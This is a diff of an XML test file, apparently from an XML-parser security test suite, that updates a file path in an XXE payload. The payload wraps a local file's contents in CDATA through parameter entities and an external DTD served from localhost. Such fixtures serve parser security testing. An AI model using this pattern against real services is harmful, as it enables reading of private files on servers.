@@ -2,7 +2,7 @@
 <!DOCTYPE data [
 <!ELEMENT data (#PCDATA)>
 <!ENTITY % start "<![CDATA[">
-<!ENTITY % goodies SYSTEM "file:///C:/Christopher_Spaeth/code/xml_files_windows/xxe.txt">
+<!ENTITY % goodies SYSTEM "file:///C:/Christopher_Spaeth/code/xml_files_windows/xxe/xxe.txt">
 <!ENTITY % end "]]>">
 <!ENTITY % dtd SYSTEM "http://127.0.0.1:5000/parameterEntity_core.dtd">
 %dtd;
